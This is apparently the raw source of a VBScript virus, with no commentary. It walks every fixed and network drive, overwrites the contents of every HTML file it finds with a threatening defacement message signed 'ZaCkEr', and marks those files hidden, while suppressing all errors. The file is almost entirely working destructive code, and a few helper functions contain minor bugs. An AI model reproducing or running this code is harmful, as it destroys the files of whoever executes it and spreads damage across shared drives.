 On Error Resume Next 
Dim fso,d, dc, s
eq =""
ctr = 0
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
folderlist(d.path&"\")
End If
Next
listadrive = s
infectfiles(folderspec)
Sub infectfiles(folderspec)
 On Error Resume Next 
Dim f, f1, fc, ext, ap
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
if(ext ="htm")or(ext="html")then
Set ap = fso.OpenTextFile(f1.Path, 2, True)
ap.write" AmeRiCa ...Few Days WiLL Show You What We Can Do !!! It's Our Turn >>> ZaCkEr is So Sorry For You ."
ap.close
Set cop = fso.GetFile(f1.Path)
cop.Copy(f1.Path)
Set att = fso.GetFile(f1.Path)
att.Attributes = att.Attributes + 2
end if
next
end sub
Function folderexist(folderspec)
On Error Resume Next
dim msg
if(fso.GetFolderExists(folderspec))then
msg = 0
else
msg = 1
End If
fileexist = msg
End Function
Sub folderlist(folderspec)
On Error Resume Next
Dim f, f1, sf
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
infectfiles(f1.path)
folderlist (f1.path)
next
end sub
Function fileexist(filespec)
On Error Resume Next
Dim msg
if(fso.FileExists(filespec))then
msg = 0
else
msg = 1
end if 
fileexist = msg
End Function
